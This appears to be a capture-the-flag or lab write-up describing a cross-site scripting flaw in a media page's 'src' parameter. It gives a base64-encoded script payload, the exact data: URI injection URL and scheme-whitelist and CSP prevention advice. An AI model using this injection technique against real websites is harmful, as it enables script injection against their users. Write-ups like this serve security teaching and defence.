# XSS via Data URI (Media Page)

## Vulnerability
The `?page=media&src=` parameter loads resources without validating the URL scheme, accepting `data:` URIs with arbitrary content.

## Exploitation
1. Navigate to `?page=media&src=nsa`
2. External URLs (e.g. `https://google.com`) are rejected
3. Encode a payload in base64:
   - Payload: `<script>alert(1)</script>`
   - Base64: `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
4. Inject as data URI: `?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
5. Server loads and executes the content, revealing the flag

## Impact
Attacker can inject arbitrary HTML/JavaScript via data URIs, enabling XSS and content injection.

## Prevention
- Validate URL scheme against a whitelist (only `http`, `https`)
- Reject `data:`, `javascript:`, `file:` schemes
- Use a strict Content Security Policy (CSP)
